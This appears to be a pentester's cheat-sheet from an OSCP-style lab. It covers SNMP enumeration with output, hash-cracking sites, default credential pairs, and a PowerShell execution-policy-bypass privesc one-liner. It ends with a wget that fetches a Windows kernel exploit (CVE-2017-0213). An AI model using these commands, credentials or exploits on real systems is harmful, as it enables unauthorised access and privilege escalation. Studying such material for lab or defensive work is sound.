
# SQLITE View
> https://inloop.github.io/sqlite-viewer/


# online cracking
https://hashes.com/en/decrypt/hash
https://crackstation.net/

# SNMP
- snmapwalk
- snmp-check
```
> snmpwalk -c public -v1 192.168.174.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
```

```
(Wed Jan-1 10:11:09am)-(CPU 8.7%:0:Net 4)-(kali:~/challenge_labs/oscp2)-(104K:8)
> snmpwalk -c public -v1 192.168.174.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
```

# Default Creds FTP,SSH,Login Panel
admin:admin
ftp:ftp
test:test
admin:admin@123
admin:password
admin:password123


# 1liner powershell
```
powershell -ep bypass -Command ". ./priv.ps1; Invoke-PrivescCheck"

```

# ad abuse
https://github.com/k4sth4/Abusing-rights-in-a-Domain


# kernal exploit 
https://www.exploit-db.com/exploits/45010

wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/2b944b52ee30f8833a21f0805d2627ca1f15383a/CVE-2017-0213/CVE-2017-0213_x86.zip
